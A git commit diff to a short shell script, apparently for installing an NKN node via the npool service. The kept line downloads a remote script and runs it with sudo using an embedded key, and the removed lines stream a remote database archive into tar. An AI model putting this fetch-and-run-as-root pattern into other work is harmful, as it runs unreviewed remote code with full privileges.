1e485ec6f0a7cf2add62b9f296b557b997a2c02b
vedhagsvp <vedhag230223@gmail.com>
2026-02-11 01:52:50 +0530

    Update apa.sh

--- apa.sh
+++ apa.sh
@@ -5,12 +5,3 @@ mkdir nkn && cd nkn
 #
 wget -c https://download.npool.io/npool.sh -O npool.sh && sudo chmod +x npool.sh && sudo ./npool.sh wW8xBLMezohupvC7
 
-#
-cd linux-amd64
-systemctl stop npool.service
-rm -rf ChainDB
-wget -c -O - https://down.npool.io/ChainDB.tar.gz  | tar -xzf -
-sudo systemctl restart npool.service
-
-#
-sudo systemctl status npool.service
